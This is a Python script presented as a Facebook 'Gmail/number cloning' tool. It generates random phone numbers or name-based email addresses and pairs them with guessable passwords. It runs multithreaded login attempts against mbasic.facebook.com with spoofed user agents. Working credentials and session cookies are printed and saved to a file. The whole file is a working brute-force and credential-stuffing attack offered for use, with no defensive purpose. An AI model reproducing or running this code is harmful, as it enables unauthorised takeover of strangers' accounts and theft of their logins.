import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
def linex():
    print("\033[1;91m_________________________________________________")
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)

logo = '''\033[1;91m
                                        
                 ..              .:.
              ~YJ^.              .~J5!.
            ^G@J                   .J@B!
         ?~ B@Y                      5@&:7?
        ^@5:#@J                      Y@@!P@^
        ~@@#&@&7        ....:~      ?@@@#@@^
       7:J@@@@@7     :75####B7      ?@@@@@J^7
       !#55#@@@~:    :!~P@@@!      :~@@@#55#!
        ~P&@@@@5J?^.    !@@@Y   .^JJ5@@@@&P^
         .7YPB&@BB##BPYY#@@@@YPB##GB@&BPY7.
          ?B##&@@@@@@@@@@@@@@@@@@@@@@@##G7
           :?G&@&G#@@@@@@@@@@@@@&#B&@#P7.
              :~?7~~?#@&@@@@&@B?^!?7^.
                 !!YP5~~&@@&~~PPJ!!
                .^7J^  5@@@@Y .^J7^
                      J@&&&&@?
                     !#&G##B&#!
                     G5&5##P&PG
                     Y7&Y##5#7Y
                     ..GJ##5P..
                       J?#&Y?
                       ~7#&J^
                       .~#&!.
                        .#&:
                        .B&:
                         G#.
                         GB
                         5P
                         7J
                         .   
                         '
                                                            
\033[1;91m_________________________________________________\n
           \033[0;96m [\033[0;96m✯\033[1;96m] \033[0;96mFB GROUP : Alienrazor
           \033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mGITHUB   : Alienrazor
           \033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mTOOL     : GMAIL/NUM CLONING 
\033[1;91m_________________________________________________\033[1;92m
    '''

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("            [01] \033[0;92mRANDOM NUM CLONING")
        print("            [02] \033[0;92mRANDOM GMAIL CLONING")
        print("            [00] \033[0;92mEXIT")
        print("\033[1;91m_________________________________________________")
        print("")
        ALIEN =input(" [?] SELECT AN OPTION=> ")
        if ALIEN in ["1", "01"]:
            num()
        if ALIEN in ["2","02"]:
            gml()
        if ALIEN in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("                 \x1b[97m[\033[37;41m  EXAMPLE   \033[0;m]")
    print("")
    print("\033[0;92m            0306 ,0300 ,0315 ,0333")
    print("\033[0;92m            0341 ,0342 ,0345 ,0349")
    print("\033[0;92m            0321 ,0316 ,0308 ,0309")
    print("")
    print("                \x1b[97m[\033[37;41m  BEST CODE   \033[0;m]")
    print("")
    print("\033[0;92m          0300 / 0302 / 0306 / 0349 /0315")
    print("")
    linex()
    print("")
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print("")
    print("                 \x1b[97m[\033[37;41m  LIMIT MENU   \033[0;m]")
    print(f"")
    limit = int(input('\033[0;92m          EXAMPLE: 2000, 3000, 50000, 100000\n\033[1;91m_________________________________________________\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        print(logo)
        tl = str(len(user))
        print("\033[0;92m             TOTAL IDZ    : \033[1;94m"+tl+"")
        print("\033[0;92m             YOUR CODE : \033[0;93m"+code)
        print("\033[0;92m             USE AIRPLANE MODE \033[0;91mON/\033[0;90mOFF \n       \033[0;92m      FOR SPEED OR NO RESULTS")
        print("\033[1;91m_________________________________________________")
        for love in user:
            uid = code+love
            pwx = [love+code+code+love]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ALIEN-ok.txt,ALIEN-cp.txt')  
  

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [+] \033[38;5;46mFAST NAME : ')
    os.system('clear')
    print(logo)
    kodex = input(' [+] \033[38;5;46mLAST NAME :  ')
    os.system('clear')
    print(logo) 
    print(' [+] \033[38;5;46mEXAMPLE : @gmail.com, @yahoo.com ')
    doamin = input(' [?] \033[38;5;46mChoose doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] \033[38;5;46mEXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input('[?] \033[38;5;46mCrack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[38;5;46m[+] ALIEN{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
        print("\033[1;91m_________________________________________________")
        print(" \033[38;5;46mYOUR CHOICE \033[38;5;46mEMAIL/CLONE ")
        print(" \033[38;5;46mCRACK START \033[38;5;46mTIME/{dt_string}  ")
        print("\033[1;91m_________________________________________________")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] \033[38;5;46mCrack process has been completed')
    print(' [+] \033[38;5;46mIds saved in ALIEN-ok.txt,ALIEN-cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[0;97m[ALIEN] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',           
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"11.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[ALIEN-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ALIEN-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[ALIEN-CP] {uid}|{ps}")
                #open('/sdcard/ALIEN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[ALIEN] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()

